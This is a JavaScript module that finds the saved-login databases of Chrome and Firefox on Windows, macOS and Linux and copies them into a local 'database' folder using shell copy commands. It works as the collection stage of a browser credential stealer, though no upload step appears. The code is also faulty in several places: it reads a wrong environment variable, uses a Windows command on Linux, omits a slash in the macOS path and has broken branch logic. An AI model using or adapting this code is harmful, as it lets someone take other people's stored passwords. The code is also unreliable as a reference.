const { exec } = require('child_process');
const { copySync } = require('fs-extra');
const path = require('path');
const local = process.env.LOCALAPPDATA,
roaming = process.env.ROAMINGAPPDATA,
p = require('path'),
// Chrome Paths
chrome_win = p.join(String(local),"Google","Chrome","User Data","Default","Login Data"),
chrome_mac = "Users/"+process.env.USER+"/Library/Application Support/Google/Chrome/Default",
chrome_lin = "/home/" + process.env.USER + "/.config/google-chrome/Default/Login Data",
// Firefox Paths
fire_win = p.join(String(roaming),"Mozilla","Firefox","Profiles"),
fire_mac = "",
fire_lin = "";

/**
 * @param {String} browser - Windows 7->10 browser to be used, NOTE: only chrome is ready
 */
function win32(browser) {
	//console.log("Browser Choice: " + browser);
	if (!browser) throw new Error("No browser specified");
	if (browser == "chrome") {
		exec(`copy ${chrome_win} ${path.resolve("./database/Chrome")}`);
		return "./database/Chrome/Login\\ Data";
	}
    if (browser == "firefox") {
		exec(`copy ${fire_win} ${path.resolve("./database/Firefox")}`);
		return "./database/Firefox/Login\\ Data";
	}
    else throw "No browser found";
}

function macos(browser) {
	console.log("Browser Choice: " + browser);
	if (!browser) throw new Error("No browser specified");
	if (browser == "chrome") {
		copySync(String(chrome_mac), "./database/")
	}
    if (browser == "firefox") {
		copySync(String(fire_mac), "./database/")
	}
    else throw "No browser found";
}

/**
 * @returns
 */
function linux(browser) {
    if (!browser) throw new Error("No browser specified");
	if (browser == "chrome") {
		exec(`copy ${chrome_lin} ${path.resolve("./database/Chrome")}`);
		return "./database/Chrome/Login\\ Data";
	}
    if (browser == "firefox") {
		exec(`copy ${fire_lin} ${path.resolve("./database/Firefox")}`);
		return "./database/Firefox/Login\\ Data";
	}
    else throw "No browser found";
}


//module.exports = Check;
module.exports = {
	win32: win32,
	linux: linux,
	macos: macos
};